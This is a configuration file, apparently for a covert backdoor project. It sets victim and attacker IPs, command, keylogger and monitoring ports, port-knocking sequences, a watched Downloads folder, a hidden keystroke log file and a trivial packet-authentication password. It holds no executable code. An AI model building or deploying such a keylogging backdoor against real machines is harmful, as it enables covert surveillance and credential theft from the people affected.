# Victim Port
victim_port = 8000

# Attacker port, varies for each feature
attacker_command_port = 6000
attacker_keylogger_port = 6001
attacker_monitor_port = 6002

# IP addresses
victim_ip = "10.0.0.109"
attacker_ip = "10.0.0.224"

# Port knocking sequence to open and close the attacker server (time-based, available to adjust on the attacker side)
keylog_knock_sequence = [6767, 6767, 6768, 6767]
monitor_knock_sequence = [8888, 8888, 8889, 8888]

# Path to monitor
watch_path = "/home/sy/Downloads"

# Keylog file to store keystrokes
keylog_file = ".keylog.txt"

# Password to authenticate backdoor packets
auth_password = "a"